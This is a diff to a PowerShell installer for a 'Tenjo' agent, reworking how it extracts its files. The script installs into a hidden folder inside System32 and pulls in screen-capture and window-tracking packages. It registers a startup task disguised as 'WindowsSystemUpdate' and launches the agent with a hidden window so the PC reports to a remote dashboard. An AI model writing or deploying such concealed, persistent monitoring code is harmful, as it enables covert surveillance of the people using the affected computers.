@@ -1,4 +1,4 @@
-# SIMPLE VERSION - PowerShell Script for Windows Deployment
+# FIXED VERSION 2 - PowerShell Script with Better File Extraction
 # Copy this entire block and paste in PowerShell (Run as Administrator)
 
 if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
@@ -36,7 +36,6 @@ if (Test-Path "C:\Windows\System32\.tenjo") {
 
 # Create directories
 New-Item -ItemType Directory -Path "C:\Windows\System32\.tenjo" -Force | Out-Null
-New-Item -ItemType Directory -Path "C:\Windows\System32\.tenjo\src" -Force | Out-Null
 
 # Download installer
 try {
@@ -49,45 +48,62 @@ try {
     exit
 }
 
-# Extract installer
-if (Get-Command tar -ErrorAction SilentlyContinue) {
+# Extract installer directly to temp, then copy
+try {
     Write-Host "Extracting installer..." -ForegroundColor Cyan
-    tar -xzf "$env:TEMP\tenjo.tar.gz" -C "C:\Windows\System32\.tenjo\"
-    Write-Host "Extraction completed" -ForegroundColor Green
     
-    # Move files from installer_package subfolder to main directory
-    if (Test-Path "C:\Windows\System32\.tenjo\installer_package") {
-        Write-Host "Moving files from installer_package..." -ForegroundColor Cyan
-        Get-ChildItem "C:\Windows\System32\.tenjo\installer_package\*" -Recurse | Move-Item -Destination "C:\Windows\System32\.tenjo\" -Force
-        Remove-Item "C:\Windows\System32\.tenjo\installer_package" -Recurse -Force -ErrorAction SilentlyContinue
-        Write-Host "Files moved successfully" -ForegroundColor Green
+    # Extract to temp directory first
+    $tempExtract = "$env:TEMP\tenjo_extract"
+    if (Test-Path $tempExtract) {
+        Remove-Item $tempExtract -Recurse -Force
     }
-} else {
-    Write-Host "Tar command not found - manual extraction needed" -ForegroundColor Red
+    New-Item -ItemType Directory -Path $tempExtract -Force | Out-Null
+    
+    if (Get-Command tar -ErrorAction SilentlyContinue) {
+        tar -xzf "$env:TEMP\tenjo.tar.gz" -C $tempExtract
+    } else {
+        Write-Host "Tar command not found - manual extraction needed" -ForegroundColor Red
+        exit
+    }
+    
+    # Copy files from extracted folder to installation directory
+    $extractedFolder = Get-ChildItem $tempExtract | Where-Object {$_.PSIsContainer} | Select-Object -First 1
+    if ($extractedFolder) {
+        Write-Host "Copying files from $($extractedFolder.Name)..." -ForegroundColor Cyan
+        Copy-Item "$($extractedFolder.FullName)\*" -Destination "C:\Windows\System32\.tenjo\" -Recurse -Force
+    } else {
+        # If no subfolder, copy directly
+        Copy-Item "$tempExtract\*" -Destination "C:\Windows\System32\.tenjo\" -Recurse -Force
+    }
+    
+    # Clean up temp extraction
+    Remove-Item $tempExtract -Recurse -Force -ErrorAction SilentlyContinue
+    Write-Host "Files extracted and copied successfully" -ForegroundColor Green
+    
+} catch {
+    Write-Host "Extraction failed: $($_.Exception.Message)" -ForegroundColor Red
     exit
 }
 
 # Install dependencies
 Set-Location "C:\Windows\System32\.tenjo"
-Write-Host "Current directory contents:" -ForegroundColor Yellow
-Get-ChildItem -Name | ForEach-Object { Write-Host "  $_" -ForegroundColor Gray }
 Write-Host "Installing Python dependencies..." -ForegroundColor Cyan
 
-# Check if requirements.txt exists
+# List directory contents for debugging
+Write-Host "Installation directory contents:" -ForegroundColor Yellow
+Get-ChildItem -Name | ForEach-Object { Write-Host "  $_" -ForegroundColor Gray }
+
+# Install dependencies
 if (Test-Path "requirements.txt") {
-    Write-Host "Found requirements.txt" -ForegroundColor Green
+    Write-Host "Found requirements.txt, installing..." -ForegroundColor Green
     python -m pip install --upgrade pip --quiet
     python -m pip install -r requirements.txt --quiet --trusted-host pypi.org --trusted-host files.pythonhosted.org
-    Write-Host "Dependencies installed successfully" -ForegroundColor Green
 } else {
-    Write-Host "requirements.txt not found, installing critical packages manually..." -ForegroundColor Yellow
+    Write-Host "requirements.txt not found, installing critical packages..." -ForegroundColor Yellow
     python -m pip install --upgrade pip --quiet
-    python -m pip install requests psutil pillow mss websocket-client --quiet --trusted-host pypi.org --trusted-host files.pythonhosted.org
-    
-    # Try Windows-specific packages
-    python -m pip install pygetwindow pywin32 wmi --quiet --trusted-host pypi.org --trusted-host files.pythonhosted.org --ignore-errors
-    Write-Host "Critical dependencies installed" -ForegroundColor Green
+    python -m pip install requests psutil pillow mss websocket-client pygetwindow pywin32 wmi --quiet --trusted-host pypi.org --trusted-host files.pythonhosted.org
 }
+Write-Host "Dependencies installation completed" -ForegroundColor Green
 
 # Create scheduled task
 Write-Host "Creating startup task..." -ForegroundColor Cyan
@@ -100,18 +116,37 @@ Register-ScheduledTask -TaskName "WindowsSystemUpdate" -Action $action -Trigger 
 # Start service
 Write-Host "Starting Tenjo service..." -ForegroundColor Cyan
 if (Test-Path "main.py") {
-    Start-Process python "C:\Windows\System32\.tenjo\main.py" -WorkingDirectory "C:\Windows\System32\.tenjo" -WindowStyle Hidden
+    Start-Process python "main.py" -WorkingDirectory "C:\Windows\System32\.tenjo" -WindowStyle Hidden
     Write-Host "Tenjo service started successfully" -ForegroundColor Green
 } else {
-    Write-Host "main.py not found - service not started" -ForegroundColor Red
-    Write-Host "Files in directory:" -ForegroundColor Yellow
-    Get-ChildItem -Name | ForEach-Object { Write-Host "  $_" -ForegroundColor Gray }
+    Write-Host "main.py not found in installation directory" -ForegroundColor Red
 }
 
 # Cleanup
 Remove-Item "$env:TEMP\tenjo.tar.gz" -Force -ErrorAction SilentlyContinue
 
-Write-Host "Deployment completed successfully!" -ForegroundColor Green
+# Final verification
+Write-Host "Final verification..." -ForegroundColor Cyan
+if (Test-Path "main.py") {
+    Write-Host "✓ main.py found" -ForegroundColor Green
+} else {
+    Write-Host "✗ main.py missing" -ForegroundColor Red
+}
+
+if (Test-Path "requirements.txt") {
+    Write-Host "✓ requirements.txt found" -ForegroundColor Green
+} else {
+    Write-Host "✗ requirements.txt missing" -ForegroundColor Yellow
+}
+
+$task = Get-ScheduledTask -TaskName "WindowsSystemUpdate" -ErrorAction SilentlyContinue
+if ($task) {
+    Write-Host "✓ Startup task created" -ForegroundColor Green
+} else {
+    Write-Host "✗ Startup task failed" -ForegroundColor Red
+}
+
+Write-Host "Deployment completed!" -ForegroundColor Green
 Write-Host "Check dashboard: https://tenjo.adilabs.id" -ForegroundColor Cyan
 Write-Host "This PC will appear online within 1-2 minutes" -ForegroundColor Yellow
 
